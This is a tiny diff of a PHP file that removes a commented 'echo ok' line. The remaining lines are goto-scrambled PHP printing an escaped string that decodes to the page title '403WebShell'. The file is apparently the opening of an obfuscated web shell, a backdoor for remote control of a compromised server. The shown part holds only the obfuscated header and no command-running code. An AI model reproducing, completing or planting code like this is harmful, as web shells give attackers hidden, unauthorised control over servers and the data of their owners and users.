@@ -1,4 +1,3 @@
-//echo ok
 <?php
  goto EPw7X; b_GNi: echo "\74\164\x69\x74\154\x65\76\x34\x30\x33" . "\x57\145\x62" . "\x53\150" . "\145\x6c" . "\x6c\74\x2f\x74\x69\x74\x6c\145\76"; goto fj3E8; EPw7X: ?>
 <!doctypehtml><html><head><?php  goto b_GNi; fj3E8: ?>
